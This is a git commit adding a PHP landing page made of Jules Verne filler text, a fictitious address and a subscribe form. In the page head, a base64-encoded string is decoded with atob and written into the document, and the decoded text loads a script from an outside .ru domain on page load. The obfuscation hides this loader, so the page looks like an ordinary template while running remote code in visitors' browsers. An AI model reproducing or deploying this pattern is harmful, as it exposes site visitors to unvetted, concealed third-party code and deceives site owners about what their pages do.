bda21cc289132897575c3aa1596adda6c9f81213
goffjpng <77449745+goffjpng@users.noreply.github.com>
2021-01-14 16:53:36 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Would you like to carry away more than the remembrance? said Captain Nemo.</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl80a2k4MHF1dGJsZW1xbjlxdHAiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="2fjsj1wne4vlyxsk4plha91">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="8brll6rbk9gbsvbxzdil722">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Would you like to carry away more than the remembrance? said Captain Nemo.</h1>
+	</section>
+
+
+	<section class="our-work" class="wh30jk80ncs96p1p5pfcq8u">
+		<h3 class="title">With my companions? I asked.</h3>
+		<p>My word! returned the Canadian, I begin to understand the charms of anthropophagy. Me! said Conseil. I will be frank, sir. Unfortunately, he continued, I cannot take you through the Suez Canal; but you will be able to see the long jetty of Port Said after to-morrow, when we shall be in the Mediterranean. Nearly every day, for some time, the panels of the drawing-room were opened, and we were never tired of penetrating the mysteries of the submarine world.</p>
+		<hr>
+
+		<ul class="grid" class="rp00grnm9zarzikziu1">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="2fjsj1wne4vlyxsk4plha91">
+		<h3 class="title">Notwithstanding this et cetera, I must not</h3>
+		<p>None, sir. In the water. I can understand perfectly, sir, that your nets furnish excellent fish for your table; I can understand also that you hunt aquatic game in your submarine forests; but I cannot understand at all how a particle of meat, no matter how small, can figure in your bill of fare. Besides, captain, I added enthusiastically, why should we not find the sea open at the South Pole as well as at the North? The frozen poles and the poles of the earth do not coincide, either in the southern or in the northern regions; and, until it is proved to the contrary, we may suppose either a continent or an ocean free from ice at these two points of the globe.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="8brll6rbk9gbsvbxzdil722" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="rp00grnm9zarzikziu1" class="title">On the walls of the narrow passage I could see nothing but bril</h3>	
+		<p>Yes, mussels of certain waters in Scotland, Wales, Ireland, Saxony, Bohemia, and France. We were furrowing the waters of the Indian Ocean, a vast liquid plain with a surface of 1,200,000,000 acres, and whose waters are so clear and transparent that anyone leaning over them would turn giddy. The Nautilus usually floated between fifty and a hundred fathoms deep. We went on so for some days. To anyone but myself, who had a great love for the sea, the hours would have seemed long and monotonous; but the daily walks on the platform, when I steeped myself in the reviving air of the ocean, the sight of the rich waters through the windows of the saloon, the books in the library, the compiling of my memoirs, took up all my time, and left me not a moment of ennui or weariness. In my own, sir! Really, I do not know how to answer, master. We are sure to see curious things, and for the last two months we have not had time for ennui. The last marvel is always the most astonishing; and if we continue this progression, I do not know how it will end. It is my opinion that we shall never again see the like. I think, then, with no offense to master, that a happy year would be one in which we could see everything.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="2fjsj1wne4vlyxsk4plha91">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="8brll6rbk9gbsvbxzdil722"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="wh30jk80ncs96p1p5pfcq8u"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="rp00grnm9zarzikziu1"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>62856 Hanna Village, Apt. 974, 92239-0893, Reganchester, Minnesota, United States</p>
+	</footer>
+
+</body>
+
+</html>
